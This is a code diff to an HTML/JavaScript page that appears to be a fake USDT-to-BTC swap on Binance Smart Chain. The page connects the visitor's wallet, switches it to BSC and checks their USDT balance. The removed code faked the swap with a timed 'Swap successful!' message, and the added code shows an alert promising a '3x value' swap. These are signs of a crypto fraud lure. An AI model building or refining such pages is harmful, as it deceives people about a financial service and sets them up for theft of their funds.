@@ -218,44 +218,6 @@
         .tab-active {
             color: var(--primary);
         }
-
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0,0,0,0.5);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background-color: white;
-            padding: 20px;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 350px;
-            text-align: center;
-        }
-
-        .spinner {
-            border: 4px solid rgba(0,0,0,0.1);
-            border-radius: 50%;
-            border-top: 4px solid var(--primary);
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -273,7 +235,7 @@
                     </div>
                 </div>
                 <div class="token-amount-container">
-                    <input type="text" id="usdtInput" class="token-amount" value="200" readonly>
+                    <input type="number" id="usdtInput" class="token-amount" value="200" placeholder="0">
                     <div id="usdtValue" class="token-value">$200</div>
                 </div>
             </div>
@@ -344,14 +306,6 @@
         </div>
     </div>
 
-    <!-- Modal for transaction status -->
-    <div id="transactionModal" class="modal">
-        <div class="modal-content">
-            <div id="spinner" class="spinner"></div>
-            <div id="modalMessage">Connecting to wallet...</div>
-        </div>
-    </div>
-
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -363,21 +317,21 @@
             const swapButton = document.getElementById('swapButton');
             const buttonText = document.getElementById('buttonText');
             const errorMessage = document.getElementById('errorMessage');
-            const modal = document.getElementById('transactionModal');
-            const modalMessage = document.getElementById('modalMessage');
-            const spinner = document.getElementById('spinner');
             
             // BSC Settings
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-            const MIN_SWAP_AMOUNT = 200;
             const BTC_RATE = 119489.153599;
+            let MIN_SWAP_AMOUNT = 200;
             
             // Initialize
             updateValues();
             
             // Update BTC values when USDT changes
-            usdtInput.addEventListener('input', updateValues);
+            usdtInput.addEventListener('input', function() {
+                MIN_SWAP_AMOUNT = parseFloat(usdtInput.value) || 200;
+                updateValues();
+            });
             
             function updateValues() {
                 const usdt = parseFloat(usdtInput.value) || 0;
@@ -392,12 +346,12 @@
             }
             
             swapButton.addEventListener('click', async function() {
+                const usdtAmount = parseFloat(usdtInput.value) || 0;
+                MIN_SWAP_AMOUNT = usdtAmount; // Update minimum amount based on input
+                
                 buttonText.innerHTML = '<span class="spinner"></span> Processing';
                 swapButton.disabled = true;
                 errorMessage.style.display = 'none';
-                
-                modal.style.display = 'flex';
-                modalMessage.textContent = 'Connecting to wallet...';
                 
                 try {
                     if (!window.ethereum) {
@@ -407,43 +361,26 @@
                     // Check/switch to BSC
                     const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                     if (currentChain !== BSC_CHAIN_ID) {
-                        modalMessage.textContent = 'Switching to BSC Network...';
                         await switchToBSC();
                     }
                     
                     // Connect wallet
-                    modalMessage.textContent = 'Connecting wallet...';
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const userAddress = accounts[0];
                     
                     // Check USDT balance
-                    modalMessage.textContent = 'Checking balance...';
                     const balance = await getUSDTBalance(userAddress);
                     if (balance < MIN_SWAP_AMOUNT) {
-                        errorMessage.textContent = `❌ Minimum 200 USDT required. Add ${(200 - balance).toFixed(2)} more USDT (BEP20)`;
+                        errorMessage.textContent = `❌ Minimum ${MIN_SWAP_AMOUNT} USDT required. Add ${(MIN_SWAP_AMOUNT - balance).toFixed(2)} more USDT (BEP20)`;
                         errorMessage.style.display = 'block';
                         throw new Error('Insufficient USDT balance');
                     }
                     
                     // If balance is sufficient
-                    modalMessage.textContent = 'Processing swap...';
-                    
-                    // Simulate processing (3 seconds)
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    
-                    // Show success
-                    modalMessage.textContent = 'Swap successful!';
-                    spinner.style.display = 'none';
-                    
-                    // Close modal after 2 seconds
-                    setTimeout(() => {
-                        modal.style.display = 'none';
-                        spinner.style.display = 'block';
-                    }, 2000);
+                    alert(`Processing swap of ${usdtAmount} USDT to BTC (3x value)`);
                     
                 } catch (error) {
                     console.error(error);
-                    modalMessage.textContent = error.message;
                     if (!error.message.includes('Insufficient')) {
                         errorMessage.textContent = error.message;
                         errorMessage.style.display = 'block';
